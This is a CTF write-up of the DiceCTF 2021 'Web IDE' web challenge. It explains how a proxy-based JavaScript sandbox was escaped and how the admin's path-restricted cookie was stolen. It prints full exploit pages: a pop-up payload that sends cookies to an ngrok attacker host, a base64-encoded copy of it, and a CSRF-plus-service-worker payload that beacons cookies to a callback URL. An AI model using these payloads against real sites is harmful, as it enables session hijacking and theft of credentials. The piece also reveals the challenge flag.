---
title: Web IDE - DiceCTF 2021
date: 2021-02-09 12:01:43
author: Yadhu Krishna M
author_url: https://twitter.com/YadhuKrishna_
categories:
 - Web Exploitation
tags:
 - DiceCTF
 - XSS
 - JavaScript Sandbox Escape
---

**tl;dr**

+ Unintended Solution: Cookie Path Restriction bypass using pop-up windows + JS Sandbox Escape
+ Intended Solution: Service Workers + JS Sandbox Escape  

<!--more-->

**No. Of Solves:** 32

**Challenge points:** 500

**Solved By:** [Az3z3l](https://twitter.com/Az3z3l), [imp3ri0n](https://twitter.com/YadhuKrishna_), [Captain-Kay](https://twitter.com/captainkay11), [1nt3rc3pt0r](https://twitter.com/_1nt3rc3pt0r_)

## Challenge Description

Work on JavaScript projects directly in your browser! Make something cool? Send it here.

**Source Code:** [here](source-code.zip)

## Analysis

We are given an online JavaScript editor and the aim is to get the cookie token (flag) of the admin. 

The application does not allow it to be iframed except for `/sandbox.html`. Also, we are not allowed to place an iframe inside `/sandbox.html`.

```
app.use('/', (req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  return next();
});

app.use('/sandbox.html', (req, res, next) => {
  res.setHeader('Content-Security-Policy', 'frame-src \'none\'');
  res.removeHeader('X-Frame-Options');
  return next();
});
```

There's an `/ide/login` end-point which sets the value of cookie token as flag if the username is `admin` and password has matched with `crypto.randomBytes(16).toString('hex')`. Also, the cookies is set only for path `/ide`. This means that the cookie will be only available in `/ide` end-point.

```
const adminPassword = crypto.randomBytes(16).toString('hex');
app.post('/ide/login', (req, res) => {
  const { user, password } = req.body;
  switch (user) {
    case 'guest':
      return res.cookie('token', 'guest', {
        path: '/ide',
        sameSite: 'none',
        secure: true
      }).redirect('/ide/');
    case 'admin':
      if (password === adminPassword)
        return res.cookie('token', `dice{${process.env.FLAG}}`, {
          path: '/ide',
          sameSite: 'none',
          secure: true
        }).redirect('/ide/');
      break;
  }
  res.status(401).end();
});
```

The admin has a feature to save and view saved JavaScript source codes. These end-points are protected by the cookie token which is the flag. 

Moving on to the HTML source code we can see that the application is implemented with postMessage and a sandboxed iframe. 

```
<iframe src="../sandbox.html" frameborder="0" sandbox="allow-scripts"></iframe>
```

According to MDN Web Docs, if `sandbox="allow-scripts"` is set, the frame can run JavaScript and cannot open pop-up windows. Looking at the implementation of sandbox at `sandbox.js`, we see that it uses a `safeEval` function. The function is invoked whenever the iframe recieves a postMessage. `safeEval` function uses JavaScript Proxy to redefine operations on objects.

```
const safeEval = (d) => (
   function (data) {
      with (new Proxy(window, {
         get: (t, p) => {
            if (p === 'console') return { log };
            if (p === 'eval') return window.eval;
            return undefined;
         }
      })) 
      {
         eval(data);
      }
}).call(Object.create(null), d);
```

With the above implementation, certain methods become inaccessible directly. Here, the console object has been redefined. However, we have access to `eval` function. 

## Unintended Solution

The first thing that we tried was to bypass the restrictions put through `sandbox.js`. This came out easier than what we thought. 

After some experimentation, we found that `console.log("".constructor);` gives `function String() { [native code] }` as the output. A quick Google search took us [here](https://gist.github.com/getify/b0533d921c9c4dbbdf02325a4bbac43f). This was exactly what we were looking for.

We were able to get the payload working. `console.log(''.sub.constructor('return btoa("hacker")')());` However, this too had a limitation. We weren't allowed to access cookies. Trying to access resulted in a `SecurityError: The operation is insecure.` This could be because the iframe was sandboxed. We now had to escape the iframe sandbox.

We quickly figured out a solution for this. We put up an iframe to `sandbox.html` from another server without `sandbox="allow-scripts"` attribute.

```
<body>
    <iframe src="https://web-ide.dicec.tf/sandbox.html" width="800" height="400"></iframe>
    <script>
      let xss = `console.log(document.cookie)`,
         payload = `''.sub.constructor('eval(${xss})')()`,
         frame = document.querySelector("iframe");

      frame.addEventListener("load", function (e) {
         console.log("loaded")
         frame.contentWindow.postMessage(payload, '*');
      });
   </script>
</body>
```

With the above exploit, we were able to read cookies that we set at `web-ide.dicec.tf`. But the flag cookie was only available at `/ide`. So the plan was to open a popup window at `/ide` and read the cookie from it using `sandbox.html`. The window took some time to load, so a setTimeout function was used to delay the redirect.

```
const win = window.open(\'/ide\');
setTimeout(function(){
  window.location=\"https://f9b3a1b68114.ngrok.io/flag/?\".concat(win.document.cookie)
}, 3000)
```

For some reason we got `SyntaxError: missing ) after argument list` for the payload. We then tried encoding our payload into base64 and it worked. So, the final payload was 

```
<!doctype html>
<html>

<body>
    <iframe src="https://web-ide.dicec.tf/sandbox.html" width="800" height="400"></iframe>
</body>
<script>
    let xss = 'ZXZhbCgnY29uc3Qgd2luID0gd2luZG93Lm9wZW4oXCcvaWRlXCcpO3NldFRpbWVvdXQoZnVuY3Rpb24oKXt3aW5kb3cubG9jYXRpb249XCJodHRwczovL2Y5YjNhMWI2ODExNC5uZ3Jvay5pby9mbGFnLz9cIi5jb25jYXQod2luLmRvY3VtZW50LmNvb2tpZSl9LCAzMDAwKScp',
        payload = "''.sub.constructor('eval(atob(\\'" + xss + "\\'))')()",
        frame = document.querySelector("iframe");

    frame.addEventListener("load", function (e) {
        console.log("loaded")
        frame.contentWindow.postMessage(payload, '*');
    });
</script>
</html>
```

If the admin visits this page, a pop-up window at `/ide` will be opened and then the admin gets redirected to an attack server with the cookies from `/ide` as parameter.

Note: The above solution will only work in headless browsers. In normal browsers, window.open pop up will be blocked by default if there are is user interaction. 

## Intended Solution

We managed to solve the challenge during the CTF using the unintended solution. We came to know about the intended solution only after the CTF. 

When the admin visits the attack server, a fetch request is made to `/ide/save` end-point with a JavaScript file. The file gets saved due to the lack of CSRF protection. The newly created JS file when recieves a fetch request, sends back an HTML response containing a script to send cookie to the specified callback URL. 

```
<iframe id='f' src='https://web-ide.dicec.tf/sandbox.html'></iframe>
<script>
  f.addEventListener('load', () => {
    f.contentWindow.postMessage(`[].slice.constructor('return this')().fetch("https://web-ide.dicec.tf/ide/save", 
      {
        "headers": {
          "content-type": "application/javascript",
        },
        "body": "
          self.addEventListener('fetch', e=>{
              if (e.request.method != 'GET') {
                return;
              } 
              e.respondWith(
                new Response('<script>navigator.sendBeacon(\\\\'CALLBACK URL HERE\\\\', document.cookie)</sc'+'ript>',
                  {
                    headers:{
                      \\'content-type\\':\\'text/html\\'
                    }
                  }
              ));
          });",
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
      })
      .then(response=>response.text())
      .then(path=>{
          [].slice.constructor('return this')().navigator.serviceWorker.register('/ide/saves/'+path, 
          {
            scope: '/ide/saves/'
          }
      )
    });`, '*');
    setTimeout(() => { location = 'https://web-ide.dicec.tf/ide/saves/' }, 1000)
  })
</script>
```

## Flag:

dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}
